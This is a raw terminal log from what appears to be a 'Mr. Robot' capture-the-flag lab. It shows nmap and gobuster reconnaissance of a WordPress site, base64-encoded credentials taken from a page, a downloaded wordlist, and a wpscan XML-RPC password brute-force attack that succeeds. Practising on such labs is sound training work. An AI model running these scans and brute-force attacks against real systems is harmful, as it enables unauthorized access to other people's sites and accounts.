@@ -1,0 +1,218 @@
+#nmap -Pn -sV -p- -vv 10.10.242.172
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 02:48 IST
+NSE: Loaded 45 scripts for scanning.
+Initiating Parallel DNS resolution of 1 host. at 02:48
+Completed Parallel DNS resolution of 1 host. at 02:48, 0.08s elapsed
+Initiating SYN Stealth Scan at 02:48
+Scanning 10.10.242.172 [65535 ports]
+SYN Stealth Scan Timing: About 3.41% done; ETC: 03:03 (0:14:37 remaining)
+SYN Stealth Scan Timing: About 10.22% done; ETC: 02:58 (0:08:56 remaining)
+SYN Stealth Scan Timing: About 16.10% done; ETC: 02:58 (0:08:25 remaining)
+SYN Stealth Scan Timing: About 22.35% done; ETC: 02:58 (0:07:21 remaining)
+SYN Stealth Scan Timing: About 28.95% done; ETC: 02:57 (0:06:25 remaining)
+SYN Stealth Scan Timing: About 36.20% done; ETC: 02:57 (0:05:30 remaining)
+SYN Stealth Scan Timing: About 42.61% done; ETC: 02:57 (0:04:52 remaining)
+SYN Stealth Scan Timing: About 48.99% done; ETC: 02:57 (0:04:23 remaining)
+SYN Stealth Scan Timing: About 55.08% done; ETC: 02:57 (0:03:56 remaining)
+SYN Stealth Scan Timing: About 62.16% done; ETC: 02:57 (0:03:14 remaining)
+SYN Stealth Scan Timing: About 69.37% done; ETC: 02:57 (0:02:34 remaining)
+SYN Stealth Scan Timing: About 78.02% done; ETC: 02:56 (0:01:47 remaining)
+SYN Stealth Scan Timing: About 86.82% done; ETC: 02:56 (0:01:02 remaining)
+Completed SYN Stealth Scan at 02:56, 473.55s elapsed (65535 total ports)
+Initiating Service scan at 02:56
+NSE: Script scanning 10.10.242.172.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 02:56
+Completed NSE at 02:56, 0.03s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 02:56
+Completed NSE at 02:56, 0.00s elapsed
+Nmap scan report for 10.10.242.172
+Host is up, received user-set (0.32s latency).
+Scanned at 2020-08-08 02:48:45 IST for 474s
+Not shown: 65532 filtered ports
+Reason: 65532 no-responses
+PORT    STATE  SERVICE REASON       VERSION
+22/tcp  closed ssh     reset ttl 63
+80/tcp  closed http    reset ttl 63
+443/tcp closed https   reset ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 474.92 seconds
+           Raw packets sent: 131366 (5.780MB) | Rcvd: 18695 (4.280MB)
+
+#gobuster dir -u http://10.10.242.172/ -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.242.172/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/08 02:49:48 Starting gobuster
+===============================================================
+
+/0
+/video (Status: 301)
+/feed (Status: 301)
+/image (Status: 301)
+/atom (Status: 301)
+/wp-content (Status: 301)
+/admin (Status: 301)
+/audio (Status: 301)
+/intro (Status: 200)
+/wp-login (Status: 200)
+/css (Status: 301)
+/rss2 (Status: 301)
+/license (Status: 200)
+/wp-includes (Status: 301)
+/js (Status: 301)
+/Image (Status: 301)
+/rdf (Status: 301)
+/page1 (Status: 301)
+/readme (Status: 200)
+/robots (Status: 200)
+
+┌─[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $curl -s http://10.10.242.172/license | tr -d "\n"
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a password or something?ZWxsaW90OkVSMjgtMDY1Mgo=┌─[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+elliot:ER28-0652
+┌─[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $
+
+
+
+
+[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $ls
+'s1 2020-08-08 02-51-58.png'  'S2 2020-08-08 02-52-28.png'
+┌─[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $wget http://10.10.242.172/fsocity.dic
+--2020-08-08 02:54:05--  http://10.10.242.172/fsocity.dic
+Connecting to 10.10.242.172:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7245381 (6.9M) [text/x-c]
+Saving to: ‘fsocity.dic’
+
+fsocity.dic         100%[===================>]   6.91M  1.12MB/s    in 12s     
+
+2020-08-08 02:54:17 (606 KB/s) - ‘fsocity.dic’ saved [7245381/7245381]
+
+┌─[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $ls
+ fsocity.dic  's1 2020-08-08 02-51-58.png'  'S2 2020-08-08 02-52-28.png'
+┌─[kevin@parrot]─[~/THM/MR.ROBOT]
+└──╼ $
+
+┌─[root@parrot]─[~]
+└──╼ #wpscan --url http://10.10.242.172 -t 50 -U elliot -P '/home/kevin/THM/MR.ROBOT/fsocity_sorted.txt' 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.2
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.242.172/ [10.10.242.172]
+[+] Started: Sat Aug  8 03:09:51 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://10.10.242.172/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.242.172/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] The external WP-Cron seems to be enabled: http://10.10.242.172/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.242.172/3576c60.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.242.172/3576c60.html, Match: 'WordPress 4.3.1'
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.10.242.172/wp-content/themes/twentyfifteen/
+ | Last Updated: 2020-03-31T00:00:00.000Z
+ | Readme: http://10.10.242.172/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 2.6
+ | Style URL: http://10.10.242.172/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.242.172/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:02 <===> (21 / 21) 100.00% Time: 00:00:02
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc Multicall against 1 user/s
+[SUCCESS] - elliot / ER28-0652                                                  
+All Found                                                                       
+Progress Time: 00:04:53 <===========           > (12 / 22) 54.54%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: elliot, Password: ER28-0652
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Sat Aug  8 03:15:18 2020
+[+] Requests Done: 82
+[+] Cached Requests: 6
+[+] Data Sent: 17.822 KB
+[+] Data Received: 16.54 MB
+[+] Memory used: 247.051 MB
+[+] Elapsed time: 00:05:27
+
+
+
